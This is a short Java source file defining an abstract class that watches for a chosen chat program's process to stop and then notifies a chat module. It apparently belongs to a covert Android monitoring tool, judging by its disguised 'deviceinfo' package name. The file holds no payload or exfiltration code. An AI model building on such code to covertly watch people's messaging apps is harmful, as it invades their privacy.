package com.android.deviceinfo.module.chat;

import com.android.deviceinfo.ProcessInfo;
import com.android.deviceinfo.ProcessStatus;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.module.ModuleChat;
import com.android.deviceinfo.module.SubModule;
import com.android.deviceinfo.util.Check;

public abstract class SubModuleChat extends SubModule {

	private static final String TAG = "SubModuleChat";
	@Override
	protected void go() {
		// TODO Auto-generated method stub

	}

	@Override
	protected void start() {
		// TODO Auto-generated method stub

	}

	@Override
	protected void stop() {
		// TODO Auto-generated method stub

	}
	
	@Override
	public int notification(ProcessInfo process) {

		if (process.processInfo.contains(getObservingProgram())) {
			if (process.status == ProcessStatus.STOP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification), observing found: " + process.processInfo);
				}
				notifyStopProgram(process.processInfo);
				return 1;
			}
		}
		return 0;
	}
	
	protected ModuleChat getModule(){
		return (ModuleChat) module;
	}

	abstract void notifyStopProgram(String processName);

	abstract int getProgramId();
	abstract String getObservingProgram();
}
